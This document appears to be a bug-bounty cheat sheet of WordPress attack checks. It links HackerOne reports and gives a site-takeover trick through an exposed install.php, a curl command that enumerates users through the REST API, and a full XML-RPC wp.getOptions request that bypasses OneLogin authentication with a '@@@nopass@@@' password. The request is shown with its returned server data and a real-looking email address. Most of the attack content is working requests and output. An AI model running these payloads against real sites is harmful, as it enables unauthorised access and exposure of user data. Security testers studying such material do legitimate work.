# Bugs to check on wordpress
- Data Exposure
- xmlrpc.php Enabled
- Using Wpscan

## Data exposure reports
https://hackerone.com/reports/356047
https://hackerone.com/reports/540301 
https://hackerone.com/reports/384782

### XMLRPC Enabled 
https://hackerone.com/reports/356047 
https://hackerone.com/reports/540301 
https://hackerone.com/reports/384782

# Not Securing wp-config.php WordPress Configuration File
# Takeover Wordpress If Not Installed
```bash
https://example.com/wp-admin/install.php
```
- If you can install wordpress again RCE boom

## Findings
- It Discloses Author And Admin Information
```bash
example.com/wp-json/wp/v2/users/
$ curl https://example.com/\?_method\=GET -d rest_route=/wp/v2/users
```
## OneLogin authentication bypass on WordPress sites via XMLRPC
- Request
```bash
POST /xmlrpc.php
Host: ex.com

<?xml version="1.0"?>
<methodCall>
<methodName>wp.getOptions</methodName>
<params>
	<param><value>zzz</value></param>
        <param><value>cbarry@uber.com</value></param>
        <param><value>@@@nopass@@@</value></param>
</params>
</methodCall>
```
- response
```bash
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <struct>
  <member><name>software_name</name><value><struct>
  <member><name>desc</name><value><string>Software Name</string></value></member>
  <member><name>readonly</name><value><boolean>1</boolean></value></member>
  <member><name>value</name><value><string>WordPress</string></value></member>
</struct></value></member>
  <member><name>software_version</name><value><struct>
  <member><name>desc</name><value><string>Software Version</string></value></member>
  <member><name>readonly</name><value><boolean>1</boolean></value></member>
  <member><name>value</name><value><string>4.4.3</string></value></member>
</struct></value></member>
  <member><name>blog_url</name><value><struct>
  <member><name>desc</name><value><string>WordPress Address (URL)</string></value></member>
  <member><name>readonly</name><value><boolean>1</boolean></value></member>
  <member><name>value</name><value><string>https://newsroom.uber.com</string></value></member>
...etc.
```
##### Exploit scenarios [Check Report](https://hackerone.com/reports/138869)

